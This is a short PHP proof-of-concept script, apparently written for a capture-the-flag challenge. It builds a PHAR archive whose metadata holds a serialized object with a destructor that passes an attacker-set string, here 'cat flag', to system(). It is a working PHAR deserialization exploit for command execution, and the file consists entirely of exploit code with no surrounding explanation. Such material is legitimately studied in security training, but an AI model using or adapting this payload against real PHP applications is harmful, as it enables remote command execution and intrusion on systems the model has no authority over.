<?php

class Vulnerable {
    function __destruct() { system($this->hook); }
}

$phar = new Phar('poc.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

$malicious_object = new Vulnerable();
$malicious_object->hook = "cat flag";
$phar->setMetadata($malicious_object); // <-- inject the trigger

$phar->stopBuffering();
